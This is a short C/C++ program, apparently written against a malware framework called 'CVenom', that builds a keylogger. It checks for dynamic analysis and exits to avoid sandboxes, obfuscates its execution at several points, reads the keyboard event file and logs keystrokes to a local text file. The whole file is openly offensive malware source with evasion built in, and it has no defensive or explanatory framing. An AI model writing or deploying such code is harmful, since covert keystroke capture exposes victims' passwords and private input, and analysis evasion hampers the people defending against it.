#include <CVenom.h>
#include <ObfuscationTools.h>
#include <KeyboardTools.h>
#include <EvasionTools.h>

int main(MALWARE_ENTRY){
        cvinit(MALWARE_INIT);

        KeyboardTools Keyboard;
        EvasionTools    Evador;
        ObfuscationTools Obfuscator;

        Obfuscator.ObfuscateExecution();

        if (Evador.CheckDynamicAnalysis() > 0)
                cvexit(0x00);

        Obfuscator.ObfuscateExecution();
        Keyboard.GetEventFile();
        Obfuscator.ObfuscateExecution();
        Keyboard.OutputTo("Test_Wala_test.txt");
        Obfuscator.ObfuscateExecution();
        Keyboard.Run();

        cvexit(MALWARE_EXIT);
}
